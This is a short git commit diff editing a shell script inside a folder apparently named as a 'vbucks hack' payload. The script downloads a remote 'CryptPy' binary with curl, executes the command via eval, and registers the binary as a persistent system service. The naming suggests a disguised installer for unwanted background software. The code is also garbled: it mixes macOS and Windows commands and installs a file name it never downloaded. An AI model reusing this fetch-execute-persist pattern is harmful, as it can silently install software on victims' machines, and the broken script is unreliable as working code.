611a7c6a4b0250489a19d0a41e288adb8e351654
Mitsuko Megumi <mitsukomegumii@gmail.com>
2018-08-30 11:46:20 -0400

    Backup.

--- payload/vbucks/src/hack/js/window-three-sources/installcryptpy-macos.sh
+++ payload/vbucks/src/hack/js/window-three-sources/installcryptpy-macos.sh
@@ -1,10 +1,10 @@
-version = $1 # Fetch version argument
+version="1.3.7" # Fetch version argument
 
-downloadUrl = "https://github.com/mitsukomegumi/CryptPy.js/releases/download/$version/cryptpy-macos" # Fetch latest build URL
-downloadCommand = 'curl -S -L '+$downloadUrl+' --output cryptpy-win.exe' # Set into command
-downloadPath = pwd
+downloadUrl="https://github.com/mitsukomegumi/CryptPy.js/releases/download/$version/cryptpy-macos" # Fetch latest build URL
+downloadCommand='curl -S -L '$downloadUrl' --output cryptpy-macos' # Set into command
+downloadPath="pwd"
 
-"$downloadCommand" | cmd # Download latest build
+eval "$downloadCommand" # Download latest build
 
 "nssm install CryptPy $downloadPath\cryptpy-win.exe" | cmd # Register service
 
